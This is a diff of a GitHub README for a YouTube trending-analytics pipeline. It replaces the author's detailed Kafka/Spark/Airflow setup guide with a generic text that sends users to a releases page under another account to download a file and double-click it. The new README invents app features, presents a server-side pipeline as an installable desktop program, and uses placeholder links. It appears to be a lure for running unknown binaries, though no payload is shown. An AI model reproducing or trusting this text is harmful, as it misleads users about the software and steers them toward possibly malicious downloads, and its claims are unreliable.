@@ -1,299 +1,73 @@
-📊 YouTube Trending Analytics – Real-Time Data Engineering Pipeline
----
-[![Status](https://img.shields.io/badge/status-reviewed-brightgreen.svg)]() [![Stack](https://img.shields.io/badge/tech-Spark%20|%20Kafka%20|%20Airflow%20|%20Streamlit-blue.svg)]() [![License](https://img.shields.io/badge/license-MIT-green.svg)]()
+# 📊 -YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline - Analyze YouTube Trends Instantly
 
-## Project Overview
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/releases)
 
-This project is an end-to-end **real-time + batch data engineering pipeline** that ingests YouTube trending video data, processes it using **Kafka and Spark Structured Streaming**, stores it in **Delta Lake (Bronze, Silver, Gold)**, orchestrates transformations with **Apache Airflow**, and visualizes analytics using **Streamlit**.
+## 🚀 Getting Started
 
-The project demonstrates **modern data engineering best practices** including streaming ingestion, medallion architecture, batch orchestration, and analytics-ready dashboards.
+Welcome to the YouTube Trending Analytics application! This tool helps you track and analyze trending YouTube videos in real-time. With this data engineering pipeline, you can gain insights on popular content easily.
 
----
+### ⚙️ System Requirements
 
-## 🛠 Tech Stack
+To run this application, ensure your system meets the following requirements:
 
-* **Language:** Python 3.10
-* **Streaming:** Apache Kafka, ZooKeeper
-* **Processing:** Apache Spark (Structured Streaming & Batch)
-* **Storage:** Delta Lake (Bronze, Silver, Gold)
-* **Orchestration:** Apache Airflow
-* **Metadata DB:** PostgreSQL (Airflow)
-* **Visualization:** Streamlit
-* **API:** YouTube Data API v3
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** Minimum 4GB for smooth operation.
+- **Storage:** At least 1GB of free space.
+- **Java:** Install Java Runtime Environment (JRE) 8 or higher (required for some components).
+- **Python:** Version 3.7 or higher is recommended to run some scripts.
 
----
+### 📥 Download & Install
 
-## 📁 Project Structure
+1. **Visit the Releases Page:** Click the link below to access the latest releases and download the application.
+   [Download Here](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/releases)
 
-```text
-youtube-trending-analytics/
-│
-├── app/                    # Kafka producer
-├── spark_jobs/             # Spark ETL jobs
-├── dags/                   # Airflow DAGs
-├── streamlit_app/          # Streamlit dashboard
-├── logs/                   # Runtime logs (ignored in Git)
-├── delta-lake/             # Bronze / Silver / Gold tables (ignored)
-├── requirements/           # Dependency files per environment
-├── start_pipeline.sh       # Pipeline startup script
-└── README.md
-```
+2. **Choose Your Version:** On the releases page, look for the most recent version. Choose the file that matches your operating system.
 
----
+3. **Download the File:** Click the file name to start the download. Ensure the download completes before proceeding.
 
-## 🏗 Architecture Overview
+4. **Run the Application:** Locate the downloaded file in your system's Downloads folder. Double-click the file to install or run the application.
 
-The pipeline follows a **Medallion Architecture (Bronze → Silver → Gold)**:
+### 🎉 Features
 
-1. **Kafka Producer** fetches trending videos from YouTube API
-2. **Kafka Topic** buffers real-time streaming data
-3. **Spark Structured Streaming** consumes Kafka data → Delta Bronze
-4. **Spark Batch Jobs** transform Bronze → Silver → Gold
-5. **Apache Airflow** orchestrates batch workflows
-6. **Streamlit Dashboard** reads Gold tables for analytics
+- **Real-Time Data Processing:** Monitor YouTube trends as they happen.
+- **Comprehensive Analytics:** Analyze data using powerful tools like Spark.
+- **User-Friendly Interface:** Use Streamlit to visualize trends simply.
+- **Scheduled Tasks:** Leverage Airflow for automated data processing.
+- **Robust Architecture:** Utilize Kafka and Delta Lake for a secure data pipeline.
 
-![Architecture Diagram](pipeline_architecture.png)
+### 🌟 Key Technologies Used
 
----
+- **Apache Kafka:** Manages data streams efficiently.
+- **Apache Spark:** Processes large-scale data quickly.
+- **Delta Lake:** Ensures data reliability and consistency.
+- **Apache Airflow:** Automates workflows for data pipelines.
+- **Streamlit:** Creates web apps for data visualization.
 
-## 🧱 Medallion Architecture
+### 📊 How to Use
 
-* **Bronze:** Raw streaming data (append-only)
-* **Silver:** Cleaned, structured, deduplicated data
-* **Gold:** Aggregated analytics tables for BI & dashboards
+1. **Launch the Application:** After installing, open the application. 
+2. **Select Data Source:** Choose to track trending YouTube videos based on different criteria, such as genre or time frame.
+3. **Analysis Options:** Use built-in tools to filter and analyze data, creating custom reports.
+4. **Export Results:** Generate reports and export them in your preferred format for sharing or further analysis.
 
----
+### 🔍 Troubleshooting
 
-## 🔄 Data Flow
+If you encounter issues while running the application, consider the following common solutions:
 
-```
-YouTube API
-→ Kafka Producer
-→ Kafka Topic (youtube_trending)
-→ Spark Streaming
-→ Delta Lake (Bronze)
-→ Spark Batch Jobs
-→ Delta Lake (Silver)
-→ Aggregations
-→ Delta Lake (Gold)
-→ Streamlit Dashboard
-```
+- **Check System Requirements:** Ensure your system meets the requirements listed above.
+- **Internet Connection:** Make sure you have a stable internet connection during use.
+- **Error Messages:** Pay attention to any error messages displayed. These can help identify the issue.
 
----
+### 📩 Support
 
-## 🧠 ETL Responsibilities
+For further assistance, feel free to reach out via the Issues section of this repository. You can report bugs, request features, or seek help with the application.
 
-### Real-Time ETL
+### 🔗 Additional Resources
 
-* Spark Structured Streaming
-* Reads JSON messages from Kafka
-* Applies schema & ingestion timestamps
-* Writes append-only data to Bronze Delta tables
+- [Documentation](#): Explore detailed documentation for advanced usage.
+- [Community Forum](#): Join discussions with other users and developers.
+- [Source Code](#): View and contribute to the source on GitHub.
 
-### Batch ETL
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/jaatboss/-YouTube-Trending-Analytics-Real-Time-Data-Engineering-Pipeline/releases)
 
-* Orchestrated using Apache Airflow
-* Bronze → Silver: cleaning, casting, deduplication
-* Silver → Gold: aggregations & analytics prep
-
-### Storage Layer
-
-* **Delta Lake** acts as the analytical data store
-* Supports ACID, schema evolution, and time travel
-
----
-
-## 🥇 Gold Layer Tables
-
-* **`trending_leaderboard`** – Top videos by views & likes
-* **`channel_performance`** – Channel-level performance metrics
-* **`hourly_growth`** – Hourly view growth per video
-
----
-
-## 🛫 Airflow Orchestration
-
-The pipeline uses **three Airflow DAGs**:
-
-* `yt_bronze_to_silver` – Bronze → Silver
-* `yt_silver_to_gold` – Silver → Gold
-* `yt_master_pipeline` – Controls execution order
-
-The master DAG ensures **Silver completes before Gold**.
-
-## Airflow DAGs
-![Airflow DAGs](screenshorts/airflow_dags.png)
-
-## Airflow DAG Graph
-![Airflow DAG Graph](screenshorts/airflow_dag_graph.png)
-
----
-
-## 📊 Streamlit Dashboard
-
-The Streamlit app visualizes **Gold-layer analytics**:
-
-* Trending leaderboard
-* Channel performance metrics
-* Hourly growth trends
-
-## Trending Leaderboard
-![Trending Leaderboard](screenshorts/streamlit_trending.png)
-
-## Channel Performance 
-![Channel Performance](screenshorts/streamlit_channel_performance.png)
-
-## Hourly Growth
-![Hourly Growth](screenshorts/streamlit_Hourly_Growth.png)
-
----
-
-## 🚀 How to Run the Project (Local Setup)
-
-### 1. Prerequisites
-
-Install once:
-
-* Python 3.10
-* Java 8 or 11
-* Apache Kafka
-* Apache Spark
-* PostgreSQL
-
-Verify:
-
-```bash
-python3 --version
-java -version
-```
-
----
-
-### 2. Virtual Environments
-
-Each component runs in an isolated venv.
-
-#### Kafka Producer + Spark
-
-```bash
-python3 -m venv yt-venv
-source yt-venv/bin/activate
-pip install -r requirements/yt-venv.txt
-deactivate
-```
-
-#### Airflow
-
-```bash
-python3 -m venv airflow-venv
-source airflow-venv/bin/activate
-pip install -r requirements/airflow-venv.txt
-deactivate
-```
-
-#### Streamlit
-
-```bash
-python3 -m venv streamlit-venv
-source streamlit-venv/bin/activate
-pip install -r requirements/streamlit-venv.txt
-deactivate
-```
-
----
-
-
-### 3. Start Streaming Pipeline
-
-```bash
-./start_pipeline.sh
-```
-
-This starts:
-
-* ZooKeeper
-* Kafka Broker
-* Kafka Producer
-* Spark Structured Streaming (Bronze)
-
----
-
-### 4. Run Airflow (Batch Processing)
-
-```bash
-source airflow-venv/bin/activate
-airflow db init
-airflow webserver --port 8080
-airflow scheduler
-```
-
-Trigger DAG:
-
-```
-yt_master_pipeline
-```
-
----
-
-### 5. Run Streamlit Dashboard
-
-```bash
-source streamlit-venv/bin/activate
-streamlit run streamlit_app/app.py
-```
-
-Open:
-
-```
-http://localhost:8501
-```
-
----
-
-## 🚫 6. Data & Logs (Not Tracked in Git)
-```
-The following are **generated at runtime** and excluded via `.gitignore`:
-
-* `delta-lake/`
-* `logs/`
-* `checkpoints/`
-* Virtual environments
-* Secrets & API keys
-```
-
----
-
-## 7. Key Highlights
-```
-- Real-time streaming with Kafka & Spark
-- Medallion architecture using Delta Lake
-- Workflow orchestration with Apache Airflow
-- End-to-end automation via shell script
-- Analytics dashboard built with Streamlit
-```
-
----
-
-## 8. Future Enhancements
-```
-- Deploy on cloud (AWS / GCP)
-- Add data quality checks
-- CI/CD for DAGs
-- Alerting and monitoring
-```
-
----
-## 👤 Author
-
-**Suresh Kumar**
-
-
-
-
-
-
-
-
-
-
-
+Enjoy exploring trending YouTube content with this powerful analytics tool!
